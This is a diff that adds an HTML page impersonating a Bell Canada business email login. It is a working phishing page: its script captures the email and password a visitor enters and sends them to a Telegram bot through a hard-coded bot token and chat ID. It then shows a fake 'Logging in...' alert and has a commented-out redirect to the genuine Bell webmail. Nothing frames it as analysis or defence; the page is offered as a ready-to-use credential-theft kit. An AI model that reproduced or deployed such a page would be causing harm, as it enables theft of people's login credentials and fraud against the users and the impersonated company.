@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bell Business Email Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-CG3HGlQ9BrCgE9bFTbWxu7v+4FCYSPmbXxk2fpQr8cmNjHh9c9nL1YbZx0+VUFmT0SR9GwKn1LTKQITuCRLBug==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Helvetica, sans-serif;
+    }
+    html, body {
+      height: 100%;
+      width: 100%;
+    }
+    .background {
+      background-image: url('https://i.postimg.cc/KYGvkZzk/photo-2025-04-17-00-27-57.jpg');
+      background-size: cover;
+      background-position: center;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .header {
+      background-color: #005aa7;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      color: white;
+      font-size: 14px;
+    }
+    .header img {
+      height: 50px;
+    }
+    .header .right {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .header a, .header i {
+      color: white;
+      text-decoration: none;
+    }
+    .main-content {
+      display: flex;
+      flex: 1;
+      align-items: flex-start;
+      justify-content: space-between;
+      padding: 50px;
+    }
+    .login-box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .login-box h2 {
+      margin-bottom: 20px;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .login-box button {
+      background-color: #003366;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .login-box .links {
+      margin-top: 10px;
+      font-size: 12px;
+      text-align: center;
+    }
+    .login-box .links a {
+      text-decoration: none;
+      color: #005aa7;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="background">
+    <div class="header">
+      <img src="https://i.ibb.co/C3V1syVq/photo-2025-04-16-23-07-47.jpg" alt="Bell Logo">
+      <div class="right">
+        <i class="fas fa-bell"></i>
+        <a href="#">Français</a>
+      </div>
+    </div>
+    <div class="main-content">
+      <div class="login-box">
+        <h2>Log in</h2>
+        <form id="loginForm">
+          <label for="email">Email address</label>
+          <input type="text" id="email" name="email" />
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" />
+          <button type="submit">Log in</button>
+        </form>
+        <div class="links">
+          <p>Forgot your password? Call <strong>310-BELL</strong> to reset it.</p>
+          <p><a href="#">Privacy</a> | <a href="#">Legal & Regulatory</a></p>
+          <p>© Bell Canada. All rights reserved.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '7872296367:AAHBItXb7od6gkGaqb4JzDFbrlsHjPLAWzY'; // Replace with your bot token
+    const CHAT_ID = '7601666417'; // Replace with your Telegram user ID
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault(); // Prevent form from submitting normally
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      const message = `🔐 Bell Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Logging in...");
+          // Optionally redirect or do something else
+          // window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
+        } else {
+          alert("Error sending to Telegram.");
+        }
+      })
+      .catch(error => {
+        alert("Network error.");
+      });
+    });
+  </script>
+</body>
+</html>
